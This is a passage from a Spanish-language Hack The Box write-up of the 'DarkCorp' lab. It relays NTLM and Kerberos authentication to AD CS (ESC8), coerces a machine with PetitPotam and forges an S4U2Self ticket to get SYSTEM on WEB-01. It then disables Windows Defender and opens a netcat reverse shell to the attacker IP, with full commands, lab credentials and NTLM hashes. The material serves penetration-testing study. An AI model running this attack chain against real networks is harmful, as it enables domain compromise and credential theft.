[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/<script>alert('XSS')</script>.aspx (Status: 400) [Size: 3490]
/aspnet_client/       (Status: 403) [Size: 1233]
/certenroll/          (Status: 403) [Size: 1233]
/trace.axd            (Status: 403) [Size: 2500]
/certsrv/mscep/mscep.dll (Status: 401) [Size: 1293]
/certsrv/mscep_admin  (Status: 401) [Size: 1293]
/~/<script>alert('XSS')</script>.aspx (Status: 400) [Size: 3490]
/iisstart.htm         (Status: 200) [Size: 703]
/certsrv/             (Status: 401) [Size: 1293]
/iisstart.png         (Status: 200) [Size: 99710]
Progress: 216 / 217 (99.54%)
===============================================================
Finished
===============================================================
```
---

### Shell as NT AUTHORITY\SYSTEM on WEB-01$

#### ESC8 Exploitation (NTLM Relay to AD CS Web Enrollment)

Ya que hemos verificado que probablemente el Domain Controller disponga del rol de `Active Directory Certificate Services (ADCS)`, decidimos verificar si existe algún template vulnerable donde realizar un ESC.

En el resultado obtenido, comprobamos que se nos indica que probablemente sea vulnerable a `ESC8`.

```bash
❯ certipy find -u victor.r@darkcorp.htb -p 'victor1gustavo@#' -dc-ip 172.16.20.1 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'DARKCORP-DC-01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'DARKCORP-DC-01-CA'
[*] Checking web enrollment for CA 'DARKCORP-DC-01-CA' @ 'DC-01.darkcorp.htb'
[!] Failed to check channel binding: NTLM not supported. Try using Kerberos authentication (-k and -dc-host).
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : DARKCORP-DC-01-CA
    DNS Name                            : DC-01.darkcorp.htb
    Certificate Subject                 : CN=DARKCORP-DC-01-CA, DC=darkcorp, DC=htb
    Certificate Serial Number           : 27637AF630C1D39945283AF47C89040C
    Certificate Validity Start          : 2024-12-29 23:24:10+00:00
    Certificate Validity End            : 2125-01-22 12:18:28+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : True
        Channel Binding (EPA)           : Unknown
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : DARKCORP.HTB\Administrators
      Access Rights
        ManageCa                        : DARKCORP.HTB\Administrators
                                          DARKCORP.HTB\Domain Admins
                                          DARKCORP.HTB\Enterprise Admins
        ManageCertificates              : DARKCORP.HTB\Administrators
                                          DARKCORP.HTB\Domain Admins
                                          DARKCORP.HTB\Enterprise Admins
        Enroll                          : DARKCORP.HTB\Authenticated Users
    [*] Remarks
      ESC8                              : Channel Binding couldn't be verified for HTTPS Web Enrollment. For manual verification, request a certificate via HTTPS with Channel Binding disabled and observe if the request succeeds or is rejected.
Certificate Templates                   : [!] Could not find any certificate templates
```

En las siguientes web podemos encontrar mucha más información sobre el `ESC8` y el proceso del ataque que realizaremos a continuación.

- [https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment)

- [https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)

- [https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/](https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/)

- [https://www.rbtsec.com/blog/active-directory-certificate-attack-esc8-adcs-web-enrollment/](https://www.rbtsec.com/blog/active-directory-certificate-attack-esc8-adcs-web-enrollment/)


> **Coerce Authentication**: El atacante coacciona a una cuenta privilegiada para que se autentique en una máquina controlada por el atacante usando NTLM. Los objetivos comunes para la coacción incluyen cuentas de máquina de Domain Controller (por ejemplo, usando herramientas como PetitPotam o Coercer, u otras técnicas de coacción basadas en RPC contra MS-EFSRPC, MS-RPRN, etc.) o cuentas de usuario Domain Admin (por ejemplo, mediante phishing u otra ingeniería social que provoque una autenticación NTLM).
>
> **Set up NTLM Relay**: El atacante configura una herramienta de NTLM relay, como el comando relay de Certipy, escuchando autenticaciones NTLM entrantes.
> 
> **Relay Authentication**: Cuando la cuenta víctima se autentica en la máquina del atacante, Certipy captura este intento de autenticación NTLM entrante y lo reenvía (relays) al endpoint vulnerable de inscripción web de AD CS (por ejemplo, https://<ca_server>/certsrv/certfnsh.asp).
> 
> **Impersonate and Request Certificate**: El servicio web de AD CS, al recibir lo que cree que es una autenticación NTLM legítima de la cuenta privilegiada relayed, procesa las solicitudes de inscripción posteriores de Certipy como si provinieran de dicha cuenta privilegiada. Certipy entonces solicita un certificado, normalmente especificando una plantilla para la cual la cuenta privilegiada relayed tiene derechos de inscripción (por ejemplo, la plantilla "DomainController" si se relaya una cuenta de máquina de DC, o la plantilla por defecto "User" para una cuenta de usuario).
> 
> **Obtain Certificate**: La CA emite el certificado. Certipy, actuando como intermediario, recibe este certificado.
>
> **Use Certificate for Privileged Access**: El atacante ahora puede usar este certificado (por ejemplo, en un archivo *.pfx) con certipy auth para autenticarse como la cuenta privilegiada suplantada vía Kerberos PKINIT, lo que podría llevar a la compromisión total del dominio.
>
>Original author: [0xdf](https://0xdf.gitlab.io/2025/07/03/htb-vulncicada.html#esc8-exploitation)
{: .prompt-info }

---
##### NTLM Relay to Add DNS Record with ntlmrelayx.py

Verificamos a través de la herramienta de `NetExec` y el módulo de `maq` que no disponemos de `MachineAccountQuota`, es decir, no podemos añadir equipos al dominio.

```bash
❯ nxc ldap 172.16.20.1 -u 'victor.r' -p 'victor1gustavo@#' -M maq
LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb) (signing:None) (channel binding:Never) 
LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
MAQ         172.16.20.1     389    DC-01            [*] Getting the MachineAccountQuota
MAQ         172.16.20.1     389    DC-01            MachineAccountQuota: 0
```

Por otro lado, tampoco podemos añadir ninguna entrada DNS desde herramientas como `bloodyAD` ya que se nos indica que no disponemos de permisos suficientes.

```bash
>  bloodyAD --host 172.16.20.1 -d darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' add dnsRecord 'DC01UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.16.9
Traceback (most recent call last):
  File "/root/.local/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/add.py", line 190, in dnsRecord
    conn.ldap.bloodyadd(record_dn, attributes=record_attr)
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py", line 208, in bloodyadd
    raise err
msldap.commons.exceptions.LDAPAddException: LDAP Add operation failed on DN DC=DC01UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb! Result code: "insufficientAccessRights" Reason: "b'00000005: SecErr: DSID-03152E29, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00'"
```

> En este punto estábamos atascados: desde `ESC8` no podemos unir equipos al dominio ni crear una entrada DNS que apunte a nuestra IP. Tras explorar varias vías, decidimos aprovechar la funcionalidad de [http://172.16.20.2:5000/check](http://172.16.20.2:5000/check), cuya lógica realiza comprobaciones POST a distintos hosts y puertos para verificar si están activos. Aunque `victor.r` autentica en el panel web, no es necesariamente el que realiza esas llamadas internas: el backend (el proceso/servicio que levanta la web) ejecuta las comprobaciones y puede hacerlo bajo una cuenta de servicio con permisos propios sobre LDAP/DNS.
>
>En nuestro caso tenemos acceso remoto a `drip.darkcorp.htb`, que no tiene `:8080` expuesto; por ello podemos reutilizar su puerto 8080 (mediante un port-forwarding desde la máquina que controla la web hacia nuestra IP) para que las peticiones POST lleguen a nuestro `ntlmrelayx`. De esta forma capturamos la autenticación que hace el servicio backend y le realizamos el relay contra el Domain Controller para intentar que sea esa cuenta de servicio (si tiene permisos) la que añada el registro DNS apuntando a nuestra IP.
{: .prompt-tip }

Para ello, desde nuestro equipo compartiremos el binario de `chisel` a través de un servidor web.

```bash
❯ ls -l /opt/chisel
.rwxrwxr-x gzzcoo gzzcoo 8.9 MB Sun Sep 29 01:40:23 2024  chisel
.rw-rw-r-- gzzcoo gzzcoo 9.3 MB Sun Sep 29 01:40:24 2024  chisel.exe

❯ python3 -m http.server 80 --directory /opt/chisel
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Nos conectaremos nuevamente al equipo `drip.darkcorp.htb` mediante las credenciales de `ebelford` descargaremos con `wget` el binario de `chisel`.

```bash
❯ sshpass -p 'ThePlague61780' ssh ebelford@drip.htb
Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have no mail.
Last login: Wed Apr 16 13:06:26 2025 from 172.16.20.1
ebelford@drip:~$ cd /tmp
ebelford@drip:/tmp$ wget 10.10.16.9/chisel; chmod +x chisel                                                                                                                                                                         
--2025-04-16 13:53:33--  http://10.10.16.9/chisel
Connecting to 10.10.16.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9371800 (8.9M) [application/octet-stream]
Saving to: ‘chisel’

chisel                                                    100%[==================================================================================================================================>]   8.94M  6.82MB/s    in 1.3s    

2025-04-16 13:53:34 (6.82 MB/s) - ‘chisel’ saved [9371800/9371800]
```

Desde nuestro equipo atacante, iniciaremos `chisel` en modo servidor aplicando el `--reverse` y que se inicie en el puerto `1234`.

```bash
❯ /opt/chisel/chisel server --reverse -p 1234
2025/04/16 21:51:36 server: Reverse tunnelling enabled
2025/04/16 21:51:36 server: Fingerprint 27vZFr+WJ90OL4jhFQRM48b3ManGxYKjqhDv2XX6KkI=
2025/04/16 21:51:36 server: Listening on http://0.0.0.0:1234
```

Desde el equipo de `drip`, deberemos conectar nuestro `chisel` a nuestro servidor a través del puerto `1234` y redirigir el tráfico del puerto `8080` a nuestro puerto `80` donde estará nuestro `ntlmrelayx` esperando la autenticación.

```bash
ebelford@drip:/tmp$ ./chisel client 10.10.16.9:1234 8080:0.0.0.0:80
2025/04/16 13:55:21 client: Connecting to ws://10.10.16.9:1234
2025/04/16 13:55:21 client: tun: proxy#8080=>0.0.0.0:80: Listening
2025/04/16 13:55:22 client: Connected (Latency 33.1559ms)
```

Por otro lado, debemos de iniciar la herramienta de `ntlmrelayx` para indicarle que añada una entrada DNS maliciosa que apunte a nuestra dirección IP de atacante. El registro DNS debe de disponer de la siguiente estructura: `<host><empty CREDENTIAL_TARGET_INFOMATION structure>`.

> En este caso apuntaremos el `target` para que sea el protocolo `LDAP` del Domain Controller y en la entrada DNS a añadir, indicaremos el hostname del `DC-01` y la estructura mencionada. El servidor estará a la espera de recibir conexiones al puerto `80`.

```bash
❯ impacket-ntlmrelayx -t 'ldap://172.16.20.1' --add-dns-record 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' '10.10.16.9'
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

Accederemos a [http://172.16.20.2:5000/check](http://172.16.20.2:5000/check) y deberemos de seleccionar el host `drip.darkcorp.htb` y el puerto `8080`, ya que es el que hemos configurado para que realice el port-forwarding. Una vez seleccionado los campos indicados, le daremos a `Check!` para tramitar la solicitud por POST.

> Recordemos que el puerto `80` de `drip.darkcorp.htb` ya estaba en uso para la página web inicial [http://drip.htb](http://drip.htb)

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_40.png)

Verificaremos que en nuestra terminal donde estamos con la herramientas `ntlmrelayx`, hemos recibido una conexión y se ha logrado autenticar al servicio `LDAP` de `172.16.20.1` bajo el contexto del usuario `DARKCORP\SVC_ACC` y se ha logrado añadir la entrada DNS indicada correctamente que apunte hacía nuestra dirección IP.

Esto es debido a que detrás del backend de la página web, quien tramita las peticiones era una cuenta de servicio llamada `svc_acc` la cual sí dispone de acceso para poder añadir entradas DNS.

```bash
❯ impacket-ntlmrelayx -t 'ldap://172.16.20.1' --add-dns-record 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' '10.10.16.9'
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Connection from 127.0.0.1 controlled, attacking target ldap://172.16.20.1
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Authenticating against ldap://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Checking if domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` DNS record
[*] Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` record!
[*] Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` pointing to `10.10.16.9` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
[*] Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. DON'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

Realizando una comprobación desde `BloodHound`, localizamos que el usuario `DARKCORP\svc_acc` forma parte del grupo `DNSADMINS` con lo cual pudimos añadir la entrada DNS debido que el usuario que corre el servicio del backend era él.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_62.png)

----
### Kerberos Relay on ADCS-ESC8 and Coercion with PetitPotam.py

El siguiente paso, una vez añadido el registro DNS que apunte hacía nuestra dirección IP de atacante, es seguir el proceso de `ADCS - ESC8` y obtener el certificado de la máquina `WEB-01$` a través de la plantilla `Machine` mediante Kerberos Relay forzando la autenticación (Coercion) con herramientas como `PetitPotam.py`.

> Ejemplo de ADCS-ESC8 Kerberos Relay --> [https://medium.com/@WireHawkSecurity/vulncicada-hack-the-box-walkthrough-50c9915c0725](https://medium.com/@WireHawkSecurity/vulncicada-hack-the-box-walkthrough-50c9915c0725)

En nuestro equipo de atacante nos dirigiremos donde tenemos nuestro repositorio de [krbrelayx](https://github.com/dirkjanm/krbrelayx/), activaremos nuestro entorno virtual e instalaremos `impacket`.

```bash
❯ pwd
/opt/krbrelayx
❯ python3 -m venv .env
❯ source .env/bin/activate
❯ pip install impacket
```

Mediante la herramienta de `krbrelayx`, indicaremos que el `-target` es el `ADCS Web Enrollment` siguiendo el `ESC8`, que utilice la plantilla `Machine` con el objetivo de solicitar el certificado de `WEB-01$`. Una vez indicado, el `krbrelayx` estará iniciado a la espera de recibir conexiones.

```bash
❯ python3 krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs --template Machine -v 'WEB-01$' -dc-ip 172.16.20.1
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

El siguiente paso es el **Coercion**, para forzar la autenticación del equipo `WEB-01$ (172.16.20.2)` hacía nuestro `krbrelayx` indicando la entrada DNS que hemos añadido anteriormente que apuntaba a nuestra dirección IP por el puerto `80`. Para realizarlo, utilizaremos la herramienta de `PetitPotam.py` con las credenciales del usuario `victor.r`.

```bash
❯ python3 /opt/PetitPotam/PetitPotam.py -u 'victor.r' -p 'victor1gustavo@#' -d darkcorp.htb 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 172.16.20.2
/opt/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.20.2[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Al volver a nuestra terminal donde tenemos iniciado el `krbrelayx`, verificaremos que hemos recibido la conexión correctamente y se ha generado el certificado PFX correspondiente al equipo `WEB-01$`.

```bash
❯ python3 krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs --template Machine -v 'WEB-01$' -dc-ip 172.16.20.1
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server

[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.11.54
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] SMBD: Received connection from 10.10.11.54
[*] GOT CERTIFICATE! ID 6
[*] Writing PKCS#12 certificate to ./WEB-01$.pfx
[*] Certificate successfully written to file
[*] HTTP server returned status code 200, treating as a successful login
[*] Skipping user WEB-01$ since attack was already performed
```

Este certificado PFX lo podemos usar para recuperar el hash NTLM de `WEB-01$` en este caso. Para ello, utilizaremos la herramienta de `certipy` para utilizar el modo de autenticación proporcionando el PFX generado. En el resultado obtenido, obtenemos el hash NTLM del equipo `WEB-01$`.

```bash
❯ certipy-ad auth -pfx WEB-01\$.pfx -dc-ip 172.16.20.1 -ns 172.16.20.1
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: web-01$@darkcorp.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'web-01.ccache'
[*] Trying to retrieve NT hash for 'web-01$'
[*] Got hash for 'web-01$@darkcorp.htb': aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675
```

Verificaremos con la herramienta de `NetExec` autenticándonos al servicio `LDAP` de que el hash NTLM del equipo `WEB-01$` es válido y podemos realizar técnicas como `Pass-the-Hash (PtH)`. Es decir, autenticarnos sin conocer las credenciales del equipo.

```bash
❯ nxc ldap 172.16.20.1 -u 'WEB-01$' -H '8f33c7fc7ff515c1f358e488fbb8b675'
LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)
LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\WEB-01$:8f33c7fc7ff515c1f358e488fbb8b675 
```

----
### S4U2Self and Pass-the-Ticket (PtT) with smbexec to get NT Authority\SYSTEM on WEB-01

Debido que disponemos de las credenciales del equipo `WEB-01$` tenemos de buscar alguna manera de poder autenticarnos en él. Si fuésemos un Domain Controller, podríamos realizar un `DCSync Attack` contra nosotros mismos para obtener los hashes NTLM, pero no es el caso, ya que somos un `Domain Computer` sin más.

> Esto se debe a que las cuentas de equipo **no obtienen** acceso de administrador local a sí mismas de forma remota.  La solución para comprometer cualquier equipo una vez que tienes su TGT o credenciales, es usar el protocolo **S4U2self** para obtener un **service ticket** usable para otro usuario (suplantado).
{: .prompt-info }

Es por ello, que podemos realizar un `S4U2Self` mediante `getST.py` de la suite de `impacket`.

Dónde:

- `darkcorp.htb/WEB-01$` es el usuario el cual nos estamos autenticando.

- `-hashes aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675` credenciales del usuario `WEB-01$`.

- `/altservice` es el **SPN** que queremos sustituir en el service ticket.  

- `-dc-ip 172.16.20.1` es el Domain Controller.

- `/impersonate` es el usuario que queremos impersonar.

A la hora de realizar el `S4USelf`, comprobamos que se ha generado correctamente un `Ticket Granting Service (TGS)` para el usuario `Administrator` sobre el servicio `CIFS`, con lo cual podríamos conectarnos remotamente con `psexec`. Una vez obtenido el TGS, lo exportaremos en la variable `KRB5CCNAME` y verificaremos que el tiquet se ha importado correctamente en nuestra sesión.

```bash
❯ impacket-getST 'darkcorp.htb/WEB-01$' -hashes aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675 -self -altservice 'cifs/web-01.darkcorp.htb' -dc-ip 172.16.20.1 -impersonate Administrator
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Changing service from WEB-01$@DARKCORP.HTB to cifs/web-01.darkcorp.htb@DARKCORP.HTB
[*] Saving ticket in Administrator@cifs_web-01.darkcorp.htb@DARKCORP.HTB.ccache

❯ export KRB5CCNAME=$(pwd)/'Administrator@cifs_web-01.darkcorp.htb@DARKCORP.HTB.ccache'

❯ klist
Ticket cache: FILE:/home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/DarkCorp/content/172.16.20.1/Administrator@cifs_web-01.darkcorp.htb@DARKCORP.HTB.ccache
Default principal: Administrator@darkcorp.htb

Valid starting       Expires              Service principal
04/16/2025 22:19:55  04/17/2025 08:19:55  cifs/web-01.darkcorp.htb@DARKCORP.HTB
	renew until 04/17/2025 22:17:37
```

Una vez con nuestro TGS impersonando al usuario `Administrator` para el servicio `cifs/web-01.darkcorp.htb`, nos conectaremos de manera remota a través de `smbexec.py` de la suite de `impacket`.

Finalmente como resultado final de la intrusión, nos encontramos bajo el contexto del usuario `NT AUTHORITY\SYSTEM` en el equipo `WEB-01$` y logramos obtener la flag `user.txt`.

```bash
❯ smbexec.py darkcorp.htb/administrator@web-01.darkcorp.htb -k -no-pass -dc-ip 172.16.20.1
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
WEB-01

C:\Windows\system32>type C:\Users\Administrator\Desktop\user.txt
8c64ff********************8c6189
```

***

## Auth as john.w

### ReverseShell with nc.exe to gain a stable shell

Una vez teniendo acceso como `NT AUTHORITY\SYSTEM` en `WEB-01$`, lo primero que realizaremos es desactivar el AV para poder cargar nuestros binarios malicioso y no tener problemas con el antivirus.

```powershell
C:\Windows\system32>powershell -c "Set-MpPreference -DisableRealtimeMonitoring $True"
```

A continuación, lo que realizaremos es obtener una shell más estable que la de `smbexec.py`. Para ello, compartiremos el binario de `nc.exe` a través de un servidor SMB.

```bash
❯ pushd /usr/share/windows-resources/binaries
/usr/share/windows-resources/binaries ~/Desktop/HackTheBox/Labs/Windows/AD/DarkCorp/content
❯ ls -l nc.exe
.rwxr-xr-x root root 58 KB Fri Mar  3 14:15:47 2023  nc.exe
❯ impacket-smbserver smbFolder $(pwd) -username gzzcoo -password gzzcoo123 -smb2support
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

Desde el equipo `WEB-01$`, añadiremos este recurso compartido a la unidad `x:` indicando las credenciales del usuario SMB configurado en el punto anterior. Una vez conectada la unidad de red, copiaremos el binario de `nc.exe` que se encuentra en el servidor SMB hacía una ruta del equipo `WEB-01$`.

```powershell
C:\Windows\system32>net use x: \\10.10.16.9\smbFolder /user:gzzcoo gzzcoo123
The command completed successfully.

C:\Windows\system32>copy x:\nc.exe C:\ProgramData\nc.exe
        1 file(s) copied.

C:\Windows\system32>dir C:\ProgramData\
 Volume in drive C has no label.
 Volume Serial Number is E2B2-45D5

 Directory of C:\ProgramData

03/03/2023  06:15 AM            59,392 nc.exe
01/16/2025  11:53 AM    <DIR>          Package Cache
05/08/2021  01:15 AM    <DIR>          regid.1991-06.com.microsoft
05/08/2021  01:15 AM    <DIR>          SoftwareDistribution
05/08/2021  02:33 AM    <DIR>          ssh
01/16/2025  07:04 AM    <DIR>          USOPrivate
05/08/2021  01:15 AM    <DIR>          USOShared
               1 File(s)         59,392 bytes
               6 Dir(s)   7,966,769,152 bytes free
```

Desde nuestra terminal de atacante, nos pondremos en escucha para recibir la Reverse Shell.

```bash
❯ rlwrap -cAr nc -nlvp 443
listening on [any] 443 ...
```

Desde el equipo `WEB-01$`, ejecutaremos el binario `nc.exe` para enviar una terminal `powershell` hacía nuestra dirección de atacante por el puerto donde estamos esperando recibir la conexión.

```powershell
C:\Windows\system32>cmd /c "C:\ProgramData\nc.exe -e powershell 10.10.16.9 443"
```

Verificaremos que hemos recibido correctamente la Reverse Shell enviada a través de `nc.exe`.

```bash
❯ rlwrap -cAr nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.54] 56247
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nt authority\system
```
---
### WinPEAS Enumeration on WEB-01$

El primer paso, será enumerar el equipo `WEB-01$` para verificar si disponemos de información adicional que nos pueda servir para movernos lateralmente dentro del dominio. Es por ello, que utilizaremos la herramienta de `winPEAS` la cual compartiremos mediante un servidor web.

> **WinPEAS** es una herramienta de enumeración/script que está diseñada para ser ejecutada en entornos Windows con el propósito de realizar auditorías de seguridad y búsqueda de potenciales vías para la escalación de privilegios. Es parte de la suite **PEAS (Privilege Escalation Awesome Scripts)**, la cual incluye scripts tanto para Windows como para sistemas Unix.
{: .prompt-info }

```bash
❯ ls -l /opt/PEASS/winPEASx64.exe
.rw-rw-r-- gzzcoo gzzcoo 9.7 MB Tue Apr  1 06:29:07 2025  /opt/PEASS/winPEASx64.exe
❯ python3 -m http.server 80 --directory /opt/PEASS
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

